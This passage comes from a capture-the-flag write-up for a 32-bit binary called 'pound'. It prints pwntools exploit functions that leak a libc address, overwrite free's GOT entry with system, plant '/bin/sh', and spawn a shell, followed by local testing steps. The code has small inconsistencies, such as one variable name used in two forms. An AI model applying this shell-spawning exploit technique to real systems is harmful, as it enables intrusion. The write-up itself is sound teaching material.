<span class="line"></span></code></pre>
<p>That’s it, <a href="/writeup_files/pound/pwnpound.py">the exploit</a> will do the job! To get a better understanding on how it works and how something more of the pseudocode written above was needed I’m gonna explain some steps in detail, also refer to comments in the file for a deeper understanding:</p>
<p><br> First step:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#CB7676">def</span><span style="color:#80A665"> first_step</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">address</span><span style="color:#666666">):</span></span>
<span class="line"><span style="color:#DBD7CAEE">	fake_address </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> address </span><span style="color:#CB7676">+</span><span style="color:#4C9A91"> 100</span></span>
<span class="line"><span style="color:#DBD7CAEE">	initialize</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">fake_address</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">	propagate_fw</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">fake_address</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">	initialize</span><span style="color:#666666">(</span><span style="color:#4C9A91">0</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">	p </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> log</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">progress</span><span style="color:#666666">(</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">Propagating_fw</span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#4D9375">	for</span><span style="color:#DBD7CAEE"> i </span><span style="color:#4D9375">in</span><span style="color:#BD976A"> xrange</span><span style="color:#666666">(</span><span style="color:#4C9A91">256</span><span style="color:#666666">):</span></span>
<span class="line"><span style="color:#DBD7CAEE">		p</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">status</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">prop </span><span style="color:#C98A7D77">"</span><span style="color:#CB7676"> +</span><span style="color:#B8A965"> str</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">i</span><span style="color:#666666">)</span><span style="color:#CB7676"> +</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D"> of 256</span><span style="color:#C98A7D77">"</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">		propagate_fw</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">fake_address</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">	propagate_fw</span><span style="color:#666666">(</span><span style="color:#4C9A91">100</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">	p</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">success</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Finish</span><span style="color:#C98A7D77">"</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">	conn</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">0</span><span style="color:#C98A7D77">"</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">	conn</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">PSA: </span><span style="color:#C98A7D77">"</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">	data </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> conn</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">State</span><span style="color:#C98A7D77">"</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">	conn</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Choice:</span><span style="color:#C98A7D77">"</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">	leak </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> data</span><span style="color:#666666">[</span><span style="color:#4C9A91">4</span><span style="color:#666666">:</span><span style="color:#4C9A91">8</span><span style="color:#666666">]</span></span>
<span class="line"><span style="color:#DBD7CAEE">	leak </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> unpack</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">leak</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">all</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">little</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#4D9375"> False</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">	log</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">info</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Fgets in libc: </span><span style="color:#C98A7D77">"</span><span style="color:#CB7676"> +</span><span style="color:#B8A965"> hex</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">leak</span><span style="color:#666666">))</span></span>
<span class="line"><span style="color:#758575DD">	#LIBCOFFSET</span></span>
<span class="line"><span style="color:#DBD7CAEE">	free_in_libc_at_runtime </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> leak</span></span>
<span class="line"><span style="color:#DBD7CAEE">	system_in_libc </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> free_in_libc_at_runtime </span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE"> system_offset</span></span>
<span class="line"><span style="color:#DBD7CAEE">	log</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">info</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">System in libc: </span><span style="color:#C98A7D77">"</span><span style="color:#CB7676"> +</span><span style="color:#B8A965"> hex</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">system_in_libc_at_runtime</span><span style="color:#666666">))</span></span>
<span class="line"><span style="color:#DBD7CAEE">	what </span><span style="color:#666666">=</span><span style="color:#666666"> (</span><span style="color:#DBD7CAEE">p32</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">system_in_libc_at_runtime</span><span style="color:#666666">)</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> p32</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">leak</span><span style="color:#666666">)</span><span style="color:#666666"> )</span></span>
<span class="line"><span style="color:#DBD7CAEE">	conn</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">4</span><span style="color:#C98A7D77">"</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">	conn</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">announcement:</span><span style="color:#C98A7D77">"</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">	conn</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#666666">(</span><span style="color:#B8A965">str</span><span style="color:#666666">(</span><span style="color:#B8A965">len</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">what</span><span style="color:#666666">)</span><span style="color:#CB7676">+</span><span style="color:#4C9A91">1</span><span style="color:#666666">))</span></span>
<span class="line"><span style="color:#DBD7CAEE">	conn</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">what</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">	conn</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Choice:</span><span style="color:#C98A7D77">"</span><span style="color:#666666">)</span></span>
<span class="line"></span></code></pre>
<p>Here the function takes in input the <code>free_in_got</code> address and before propagating it up to <code>char *announcement</code> adds <code>100</code> to later move this into <code>int announcement_length</code>. Then leaks the <code>free_in_libc_at_runtime</code> address, calculates <code>system_in_lib_at_runtime</code> using the offset obtained from the leaked libc ad writes it into <code>free_in_got</code></p>
<p><br>Free pointer step:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#CB7676">def</span><span style="color:#80A665"> free_pointer</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">address</span><span style="color:#666666">):</span></span>
<span class="line"><span style="color:#DBD7CAEE">	p </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> log</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">progress</span><span style="color:#666666">(</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">Propagating_bw</span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#4D9375">	for</span><span style="color:#DBD7CAEE"> i </span><span style="color:#4D9375">in</span><span style="color:#BD976A"> xrange</span><span style="color:#666666">(</span><span style="color:#4C9A91">260</span><span style="color:#666666">):</span></span>
<span class="line"><span style="color:#DBD7CAEE">		p</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">status</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">prop </span><span style="color:#C98A7D77">"</span><span style="color:#CB7676"> +</span><span style="color:#B8A965"> str</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">i</span><span style="color:#666666">)</span><span style="color:#CB7676"> +</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D"> of 260</span><span style="color:#C98A7D77">"</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">		propagate_bw</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">address</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">	p</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">success</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Finish</span><span style="color:#C98A7D77">"</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">	initialize</span><span style="color:#666666">(</span><span style="color:#4C9A91">0</span><span style="color:#666666">)</span></span>
<span class="line"></span></code></pre>
<p>After a little debugging we found out that just “dragging” amounts into <code>announcement</code> could cause some problem since values would get summed up in an unwanted way, so we defined a procedure to “drag back” the value into the “legit space” (<code>int s2_citizens[l2_len]</code>) and purge it away by reinitilizing everything to 0.</p>
<p><br>Second step:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#CB7676">def</span><span style="color:#80A665"> second_step</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">address</span><span style="color:#666666">):</span></span>
<span class="line"><span style="color:#DBD7CAEE">	initialize</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">address</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">	propagate_fw</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">address</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">	initialize</span><span style="color:#666666">(</span><span style="color:#4C9A91">0</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">	p </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> log</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">progress</span><span style="color:#666666">(</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">Propagating</span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#4D9375">	for</span><span style="color:#DBD7CAEE"> i </span><span style="color:#4D9375">in</span><span style="color:#BD976A"> xrange</span><span style="color:#666666">(</span><span style="color:#4C9A91">256</span><span style="color:#666666">):</span></span>
<span class="line"><span style="color:#DBD7CAEE">		p</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">status</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">prop </span><span style="color:#C98A7D77">"</span><span style="color:#CB7676"> +</span><span style="color:#B8A965"> str</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">i</span><span style="color:#666666">)</span><span style="color:#CB7676"> +</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D"> of 256</span><span style="color:#C98A7D77">"</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">		propagate_fw</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">address</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">	p</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">success</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Finish</span><span style="color:#C98A7D77">"</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">	what </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">/bin/sh</span><span style="color:#C99076">\x00</span><span style="color:#C98A7D77">"</span></span>
<span class="line"><span style="color:#DBD7CAEE">	conn</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">4</span><span style="color:#C98A7D77">"</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">	conn</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">announcement:</span><span style="color:#C98A7D77">"</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">	conn</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#666666">(</span><span style="color:#B8A965">str</span><span style="color:#666666">(</span><span style="color:#B8A965">len</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">what</span><span style="color:#666666">)</span><span style="color:#CB7676">+</span><span style="color:#4C9A91">1</span><span style="color:#666666">))</span></span>
<span class="line"><span style="color:#DBD7CAEE">	conn</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">what</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">	conn</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Choice:</span><span style="color:#C98A7D77">"</span><span style="color:#666666">)</span></span>
<span class="line"></span></code></pre>
<p>Similar to the first one, puts a valid bss address into <code>announcement</code> pointer and writes <code>/bin/sh</code> into it.</p>
<p><br>Final step:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#CB7676">def</span><span style="color:#80A665"> final_step</span><span style="color:#666666">():</span></span>
<span class="line"><span style="color:#DBD7CAEE">	conn</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">4</span><span style="color:#C98A7D77">"</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">	conn</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">announcement:</span><span style="color:#C98A7D77">"</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">	conn</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">1000</span><span style="color:#C98A7D77">"</span><span style="color:#666666">)</span></span>
<span class="line"></span></code></pre>
<p>Calling option 4 (<code>void create_announcement()</code>) and passing a bigger size than <code>100</code> makes the program free the old announcement and trigger the call to <code>system("/bin/sh")</code>.</p>
<p><br>Testing:</p>
<ul>
<li>Compile binary: <code>clang -m32 -DL1="285" -DL2="N;k" ./pound.c -o pound</code></li>
<li>Open binary with disassembler. Extract <code>free_in_got</code> address and find a <code>valid_bss_addr</code> far from where the <code>global</code> structure will be allocated.</li>
<li>Modify this information in the <code>pwnpound.py</code> script.</li>
<li>Modify <code>LIBCPATH</code> according to your system.</li>
<li>Comment out <code>python_step()</code> used to connect to the python server.</li>
<li><code>socat tcp-l:4000,reuseaddr,fork exec:"./pound"</code></li>
<li><code>python pwnpound.py</code></li>
</ul>
<p>~ marcof</p>  </div> </article> </main> <footer data-astro-cid-sz7xmlte>
&copy; 2025 Tower of Hanoi. All rights reserved.
<div class="social-links" data-astro-cid-sz7xmlte> <a href="https://twitter.com/towerofhanoi" target="_blank" data-astro-cid-sz7xmlte> <span class="sr-only" data-astro-cid-sz7xmlte>Follow Tower of Hanoi on Twitter</span> <svg viewBox="0 0 16 16" aria-hidden="true" width="32" height="32" astro-icon="social/twitter" data-astro-cid-sz7xmlte><path fill="currentColor" d="M5.026 15c6.038 0 9.341-5.003 9.341-9.334 0-.14 0-.282-.006-.422A6.685 6.685 0 0 0 16 3.542a6.658 6.658 0 0 1-1.889.518 3.301 3.301 0 0 0 1.447-1.817 6.533 6.533 0 0 1-2.087.793A3.286 3.286 0 0 0 7.875 6.03a9.325 9.325 0 0 1-6.767-3.429 3.289 3.289 0 0 0 1.018 4.382A3.323 3.323 0 0 1 .64 6.575v.045a3.288 3.288 0 0 0 2.632 3.218 3.203 3.203 0 0 1-.865.115 3.23 3.23 0 0 1-.614-.057 3.283 3.283 0 0 0 3.067 2.277A6.588 6.588 0 0 1 .78 13.58a6.32 6.32 0 0 1-.78-.045A9.344 9.344 0 0 0 5.026 15z" data-astro-cid-sz7xmlte></path></svg> </a> <a href="https://github.com/towerofhanoi" target="_blank" data-astro-cid-sz7xmlte> <span class="sr-only" data-astro-cid-sz7xmlte>Go to Tower of Haoi's GitHub repo</span> <svg viewBox="0 0 16 16" aria-hidden="true" width="32" height="32" astro-icon="social/github" data-astro-cid-sz7xmlte><path fill="currentColor" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.012 8.012 0 0 0 16 8c0-4.42-3.58-8-8-8z" data-astro-cid-sz7xmlte></path></svg> </a> <a href="https://ctftime.org/team/300" target="_blank" data-astro-cid-sz7xmlte> <span class="sr-only" data-astro-cid-sz7xmlte>Go to Tower of Hanoi's CTF Time page</span> <svg viewBox="0 0 16 16" width="32" height="32" data-astro-cid-sz7xmlte> <path fill="currentColor" d="M 0,0 H 16 V 16 H 0 L 4.7205698,7.7838485 Z" data-astro-cid-sz7xmlte></path> </svg> </a> </div> </footer>  </body></html>